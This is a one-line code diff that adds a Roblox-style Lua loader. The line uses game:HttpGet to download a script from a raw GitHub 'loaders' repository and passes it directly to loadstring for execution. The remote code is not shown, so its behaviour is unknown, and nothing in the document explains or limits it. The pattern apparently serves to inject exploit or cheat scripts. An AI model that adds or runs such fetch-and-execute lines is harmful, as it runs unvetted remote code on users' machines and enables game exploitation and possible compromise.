@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/upd-8-cvr-retro-spam7-rolt29i5hymper.lua"))()
